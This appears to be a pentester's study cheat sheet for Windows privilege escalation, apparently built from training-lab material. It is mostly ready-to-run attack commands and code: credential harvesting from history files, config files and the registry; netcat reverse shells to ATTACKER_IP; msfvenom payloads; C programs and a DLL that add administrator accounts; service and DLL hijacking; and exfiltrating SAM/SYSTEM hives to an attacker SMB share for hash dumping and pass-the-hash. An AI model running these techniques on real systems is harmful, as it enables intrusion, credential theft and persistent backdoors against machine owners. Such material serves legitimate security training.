#### Harvesting Password
  #### Powershell History　　－　in cmd
    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    // To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 

  #### Saved Windows Credentials
    cmdkey /list
    //runas to view a username in the list, nad launch a cmd
    runas /savecred /user:xxx cmd.exe
  #### add user as admin in PS
    net user name passwd /add;
    net localgroup Administrators /add;

    save it as a .ps1 script or run it directly.

    login with psexec.py
      psexec.py user:'passwd!'@IP
  #### IIS Configuration
    type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
    or C:\inetpub\wwwroot\web.config

  #### Retrieve Credentials from Software: PuTTY
    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s  
      // Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
  #### Scheduled Tasks
    schtasks
    schtasks /query /tn vulntask /fo list /v //to view a particular task

    icacls c:\tasks\xxx  //to view the privi, F is full access

    //if yes we can modify it as a backdoor,
    echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
    schtasks /run /tn vulntask  //run immediately
  
  #### AlwaysInstallElevated  
    msi files can be configured to run with higher privileges from any user account (even unprivileged ones)
      //enable below 2 values
    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    //msf create revershell msi, should also run the Metasploit Handler module configured accordingly
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

     msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

  #### win service - Unquoted Service Paths - msf requied for creating a reverse shell file 
    sc qc "disk sorter enterprise"  
      DISPLAY_NAME       : Disk Sorter Enterprise  //spaces on the name of the "Disk Sorter Enterprise" folder
      //SCM doesn't know which of the following you are trying to execute:C:\MyPrograms\Disk.exe plus  Argument1:Sorter plus Argument1:Enterprise\bin\disksrs.exe
      or C:\MyPrograms\Disk Sorter.exe  plus  Argument1:Enterprise\bin\disksrs.exe
      or C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
    we put the revershell file on C:\\MyPrograms\\Disk.exe // we must have write privi to this path
     //most of the service executables will be installed under C:\Program Files or C:\Program Files (x86)
    //restart the service and get shell

   #### win service - Insecure Service Permissions -  msf requied for creating a reverse shell file 
     //check for a service DACL from the command line, you can use Accesschk.exe
       [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users  //SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.
     accesschk64.exe -qlc xxx
     //generate reversehll file , grant privi,modify config of service 
     sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem  // localsystem is high privi of a local host.

  #### Service Hijacking
  //check all services.  binaries are located in the C:\xampp\ directory instead of C:\Windows\System32 means installed by user
  `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

  //check privi, replace the exe file to add user of admin
  `icacls "C:\xampp\apache\bin\httpd.exe"`
  //If have write privi
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
//compile it
`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

`net stop mysql`

//start the service again, or if it is auto restart OS.
//being in the Administrators group doesn't give you an elevated token by default
`Start-Process powershell -Verb RunAs`

#### dll Hijacking
//DLLs  standard search order
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```
//check the software
`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

//check the write privi to the path of  target software

//use Procmon64.exe to check which dll was loaded when some operations happened
//use "Process Name" to filter and add the software first, then, use path filter the xxx.dll which is vulned to hijack, literally from a CVE.
//replace the dll by malicious one, could be a msf rev shell.
// for this case , use cpp file, add a user into admin grp
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators xxx /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
compile it 
`x86_64-w64-mingw32-gcc xxx.cpp --shared -o xxx.dll`

//replace the dll in the path of softw.

#### unqueted service path
```
C:\Program Files\My Program\My Service\service.exe.

When Windows starts the service, it will use the following order to try to start the executable file due to the spaces in the path.

C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

//search for service with the PAth unqueted.
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

//then check for the path we have write priv, for 'C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe'
```
icacls "C:\"
icacls "C:\Program Files"
etc..
```
//check if we can start and stop the service
`Start-Service GammaService`
`BUILTIN\Users:(OI)(CI)(RX,W)`

add the payload .exe file in hte path with the name of string before ' ' space.

for creating .exe payload, refer to service hijacking.

We can also use PowerUp.ps1 to do this:
```
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name 'xxxx' -Path "C:\xxxx\xx\xx\xx.exe"
Restart-Service GammaService
net user
```

  #### Windows Privileges - SeBackup / SeRestore
    whoami /priv
      SeBackupPrivilege             Back up files and directories  Disabled
      SeRestorePrivilege            Restore files and directories  Disabled
    reg save hklm\system C:\Users\THMBackup\system.hive
    reg save hklm\sam C:\Users\THMBackup\sam.hive

    //on attack host, set a smb server
      impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share  //make sure impacket installed on kali

    C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
    C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

    impacket-secretsdump -sam sam.hive -system system.hive LOCAL
    impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.201.91.4

  #### Windows Privileges - SeTakeOwnership
    takeown /f C:\Windows\System32\Utilman.exe
    icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
    C:\Windows\System32\> copy cmd.exe utilman.exe
    //lock account, then click ease of access button , will get a shell with system
    
  
  #### Windows Privileges - SeImpersonate / SeAssignPrimaryToken
    RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
  #### app vuln
    wmic product get name,version,vendor //list apps
  #### win kernel CVE serach
    systeminfo > info.txt
    python3 windows-exploit-suggester.py  --database 2025-09-13-mssb.xlsx --systeminfo /tmp/info.txt
